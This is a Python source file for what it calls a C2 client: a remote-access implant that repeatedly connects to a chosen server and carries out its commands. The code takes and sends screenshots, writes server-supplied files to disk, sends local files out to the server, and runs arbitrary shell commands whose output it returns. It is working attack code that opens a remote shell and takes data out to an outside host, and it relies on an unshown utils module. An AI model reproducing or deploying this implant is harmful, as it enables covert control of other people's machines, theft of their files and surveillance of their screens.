"""
This module is the main module for a C2 client.
"""
import io
import logging
import os
from argparse import ArgumentParser
from multiprocessing import Process
from shlex import split
from sys import stdout, stderr, exit as sys_exit
from tempfile import TemporaryFile
from time import sleep

import pyscreenshot as ImageGrab

import utils
from utils import C2Socket, RemoteDisconnected, Commands

LOGGER_CLIENT_FORMAT = '%(pathname)s:%(lineno)s %(asctime)s %(name)s:%(levelname)s %(message)s'
LOGGER_UTILS_FORMAT = '%(pathname)s:%(lineno)s %(asctime)s %(name)s:%(levelname)s %(ip)s:%(port)s %(message)s'
DEFAULT_PORT = 8888

# Client logger config
LOGGER = logging.getLogger('client')
LOGGER.setLevel(logging.DEBUG)
HANDLER = logging.StreamHandler()
HANDLER.setLevel(logging.DEBUG)
HANDLER.setFormatter(logging.Formatter(LOGGER_CLIENT_FORMAT, '%H:%M:%S'))
LOGGER.addHandler(HANDLER)

# Utils logger config
UTILS_HANDLER = logging.StreamHandler()
UTILS_HANDLER.setLevel(logging.DEBUG)
UTILS_HANDLER.setFormatter(logging.Formatter(LOGGER_UTILS_FORMAT, '%H:%M:%S'))
utils.LOGGER.addHandler(UTILS_HANDLER)


def input_parser(target):
    """ Transform input argument

    Args:
        target (str): User input like "ip:port"

    Returns (tuple[str,int]): tuple of IP, PORT

    """
    ip_addr, *port = target.split(':')
    return ip_addr, int(port[0]) if port and port[0].isdigit() else DEFAULT_PORT


class ClientCommands(Commands):
    """ Extension of Commands class containing all clients commands

    """

    def command_screenshot(self):
        """ Take screenshot and send it to C2 """
        img = ImageGrab.grab()
        with io.BytesIO() as file:
            img.save(file, format=img.format)
            self.sock.send_file(file)

    def command_upload(self, filename):
        """ Receive file from C2 and save it to local HD """
        LOGGER.debug("Local filename to save : %s", filename)
        try:
            with open(filename, 'wb') as file:
                self.sock.read_into_file(file)
                LOGGER.debug("Written : %s", filename)
        except OSError as err:
            LOGGER.error("Error trying to upload %s : %s, %s", filename, type(err), err)

    def command_exit(self):
        """ Properly exit """
        LOGGER.debug("Server ask to finish")
        self.sock.sock.close()
        raise RemoteDisconnected()

    def command_download(self, filename):
        """ Send local file to C2 """
        LOGGER.debug("Local filename to send : %s", filename)
        try:
            with open(filename, 'rb') as file:  # type: io.BufferedReader
                self.sock.send_file(file)
        except OSError as err:
            LOGGER.error("Error trying to download %s : %s, %s", filename, type(err), err)
            self.sock.send_file(io.BytesIO(f"Cannot download file : {err}".encode()))

    def command_sh(self, *cmd):
        """ Send local file to C2 """
        LOGGER.debug(self.input)

        def exec_shell():
            os.dup2(tmp.fileno(), stdout.fileno())
            os.dup2(tmp.fileno(), stderr.fileno())
            os.system(self.input)
            sys_exit(0)

        with TemporaryFile() as tmp:
            proc = Process(target=exec_shell, daemon=True)
            proc.start()
            proc.join()
            tmp.seek(0)
            output = tmp.read()
            LOGGER.debug("Output : %s", output)
            self.sock.send_packet(output)


def main(srv_ip, srv_port):
    """ Connect to server and wait for incoming commands
    """
    try:
        with C2Socket(srv_ip, srv_port) as server:
            while True:
                LOGGER.debug("Wait command from %s", server)
                data = server.read_packet().decode()

                cmd_name, *cmd_args = split(data)
                LOGGER.debug("Got command from %s : (%s) -> %s", server, cmd_name, cmd_args)
                command = ClientCommands(server, cmd_name, cmd_args, data)
                if command.is_valid():
                    command.execute()
    except RemoteDisconnected as err:
        LOGGER.warning("Server disconnect : %s", err)
    except ConnectionRefusedError:
        LOGGER.warning("Cannot connect to %s:%s", srv_ip, srv_port)


if __name__ == '__main__':
    PARSER = ArgumentParser()
    PARSER.add_argument('-t', '--target', nargs='+', type=input_parser, required=True,
                        help=f'Host at IP:PORT format. Default port : {DEFAULT_PORT}')
    ARGS = PARSER.parse_args()

    try:
        while True:
            for server_ip, server_port in ARGS.target:
                main(server_ip, server_port)
            sleep(2)

    except KeyboardInterrupt:
        LOGGER.info("User cancel")
    except BaseException as base_err:
        LOGGER.critical("Unknown exception : %s", base_err)
        sys_exit(1)
